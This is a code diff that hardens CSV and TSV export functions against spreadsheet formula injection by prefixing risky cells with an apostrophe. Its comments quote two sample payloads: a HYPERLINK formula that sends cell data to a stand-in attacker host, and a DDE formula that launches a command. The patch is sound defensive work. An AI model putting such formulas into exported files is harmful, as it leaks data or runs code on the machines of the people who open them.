@@ -13,9 +13,30 @@
  */
 export const UTF8_BOM = '\uFEFF';
 
-/** RFC 4180 field: always quoted, embedded quotes doubled. */
+/**
+ * Excel, Sheets and LibreOffice read a leading `=`, `+`, `-`, `@`, tab or CR in
+ * an imported cell as the start of a formula. RFC 4180 quoting does NOT stop
+ * that — the quotes are stripped during import and the value is evaluated, so
+ * a coded excerpt reading `=HYPERLINK("http://evil.example/?d="&A1,"Click")`
+ * becomes a live exfiltration link in the researcher's spreadsheet.
+ *
+ * The .xlsx writer solves this by pinning the cell to the Text number format
+ * (`excelExport.ts`), which a delimited file has no way to express. The
+ * remaining option is the leading apostrophe: every spreadsheet treats it as
+ * "the rest is text", strips it on display, and keeps the value inert.
+ *
+ * Only cells that would otherwise be evaluated are touched, so ordinary text
+ * is byte-identical to before.
+ */
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+export function neutralizeFormula(value: string): string {
+  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
+}
+
+/** RFC 4180 field: always quoted, embedded quotes doubled, formulas defused. */
 export function escapeCsvField(value: string): string {
-  return `"${value.replace(/"/g, '""')}"`;
+  return `"${neutralizeFormula(value).replace(/"/g, '""')}"`;
 }
 
 /**
@@ -25,5 +46,8 @@ export function escapeCsvField(value: string): string {
  * editor still looks like a table.
  */
 export function escapeTsvField(value: string): string {
-  return /[\t\n\r"]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
+  // Same formula guard as CSV — the TSV path emitted `=cmd|' /C calc'!A0`
+  // completely bare, and a clipboard paste lands in the same spreadsheet.
+  const safe = neutralizeFormula(value);
+  return /[\t\n\r"]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
